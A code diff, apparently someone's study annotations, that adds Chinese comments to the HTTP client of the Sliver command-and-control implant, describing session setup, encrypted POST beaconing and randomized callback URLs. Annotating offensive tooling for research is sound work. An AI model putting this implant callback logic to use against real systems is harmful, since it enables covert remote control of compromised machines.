@@ -340,7 +340,7 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 // session key yet.
 // 将构造好的加密数据包选择一种随机的编码方式进行编码
 // 构造上线URI，包括添加随机字符串、OTP等
-// 向Server发送请求包
+// 向Server发送Post请求包
 // Server回报后，解码、解密，拿到SessionID
 func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 	// 随机使用一个编码方式
@@ -470,6 +470,8 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 }
 
 // WriteEnvelope - Perform an HTTP POST request
+// envelope为消息类型+消息内容(序列化后的)
+// 发送Post请求，Data为加密、编码后的envelope
 func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	if s.Closed {
 		return ErrClosed
@@ -501,6 +503,7 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
 	// {{end}}
 
+	// 发送POST请求，reader为加密、编码后的信息
 	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	resp, err := s.driver.Do(req)
 	// {{if .Config.Debug}}
@@ -601,6 +604,7 @@ func (s *SliverHTTPClient) startSessionURL() *url.URL {
 	return curl
 }
 
+// 获取回连地址
 func (s *SliverHTTPClient) sessionURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{
@@ -613,6 +617,7 @@ func (s *SliverHTTPClient) sessionURL() *url.URL {
 		"{{.}}",
 		// {{end}}
 	}
+	// 增加随机路由
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.SessionFileExt}}"))
 	return curl
 }
